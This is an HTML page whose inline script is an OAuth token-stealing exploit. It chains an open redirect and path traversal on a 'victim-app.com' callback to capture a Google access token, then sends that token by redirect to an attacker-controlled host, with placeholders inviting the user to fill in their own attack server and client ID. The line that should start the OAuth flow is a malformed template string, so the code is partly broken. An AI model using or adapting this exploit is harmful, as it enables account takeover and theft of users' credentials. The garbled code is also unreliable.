<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
<script>
(function() {
    const attackerServer = 'https://oauth-token-stealer.onrender.com'; // Replace with your attack server

    // If token is not yet captured, start OAuth flow
    if (!location.hash.includes('access_token')) {
        const oauthServer = 'https://accounts.google.com'; // Replace with target OAuth server
        const clientId = 'YOUR_GOOGLE_CLIENT_ID'; // Replace with actual client ID
        const redirectToOpenRedirect = encodeURIComponent(
            'https://victim-app.com/oauth-callback/../post/next?path=' + attackerServer + '/exploit'
        );

        const url = `$oauth-token-stealer.onrender.com`;
        window.location = url;
    } else {
        // Send token to attacker's server
        const token = location.hash.substring(1); // Remove the leading "#"
        const exfilUrl = `${attackerServer}/?${token}`;
        window.location = exfilUrl;
    }
})();
</script>
</body>
</html>
